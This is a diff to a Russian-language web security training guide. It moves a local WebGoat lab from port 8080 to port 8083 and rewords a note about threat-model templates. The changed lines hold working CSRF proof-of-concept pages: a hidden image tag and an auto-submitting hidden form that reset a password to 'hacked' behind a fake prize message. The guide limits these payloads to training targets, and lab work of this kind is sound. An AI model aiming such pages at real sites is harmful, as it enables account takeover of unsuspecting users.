@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.
 
 
-**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.
+**Процессный артефакт:** встроенный шаблон threat model или finding из пользовательской инструкции: abuse case, evidence и expected control.
 
 **Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.
 
@@ -179,8 +179,8 @@ Kali ARM64 VM используется как углубление, когда �
 
 ### Настройка WebGoat
 
-1. Убедитесь, что WebGoat запущен: `docker run -d -p 8080:8080 webgoat/goatandwolf`
-2. Откройте http://127.0.0.1:8080/WebGoat
+1. Убедитесь, что WebGoat запущен: `docker run -d -p 8083:8080 webgoat/goatandwolf`
+2. Откройте http://127.0.0.1:8083/WebGoat
 3. Войдите под любым именем (значения не важны)
 
 ### Практика: CSRF в WebGoat
@@ -199,7 +199,7 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 <html>
 <body>
   <h1>Поздравляем! Вы выиграли приз!</h1>
-  <img src="http://127.0.0.1:8080/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" style="display:none">
+  <img src="http://127.0.0.1:8083/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" style="display:none">
 </body>
 </html>
 ```
@@ -214,7 +214,7 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 ```html
 <html>
 <body>
-  <form action="http://127.0.0.1:8080/WebGoat/csrf/basic-post" method="POST" id="csrf">
+  <form action="http://127.0.0.1:8083/WebGoat/csrf/basic-post" method="POST" id="csrf">
     <input type="hidden" name="newPassword" value="hacked">
     <input type="hidden" name="confirmPassword" value="hacked">
   </form>
@@ -242,7 +242,7 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 <html>
 <body>
   <h1>Поздравляем! Вы выиграли приз!</h1>
-  <img src="http://127.0.0.1:8080/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked"
+  <img src="http://127.0.0.1:8083/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked"
        style="display:none">
 </body>
 </html>
@@ -261,7 +261,7 @@ HTTP/1.1 200 OK
 
 **HTML-форма для POST CSRF:**
 ```html
-<form action="http://127.0.0.1:8080/WebGoat/csrf/basic-post" method="POST" id="csrf">
+<form action="http://127.0.0.1:8083/WebGoat/csrf/basic-post" method="POST" id="csrf">
   <input type="hidden" name="newPassword" value="hacked">
   <input type="hidden" name="confirmPassword" value="hacked">
 </form>
@@ -289,7 +289,7 @@ HTTP/1.1 200 OK
 cat > /tmp/csrf.html << 'EOF'
 <html>
 <body>
-  <img src="http://127.0.0.1:8080/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked"
+  <img src="http://127.0.0.1:8083/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked"
        style="display:none">
 </body>
 </html>
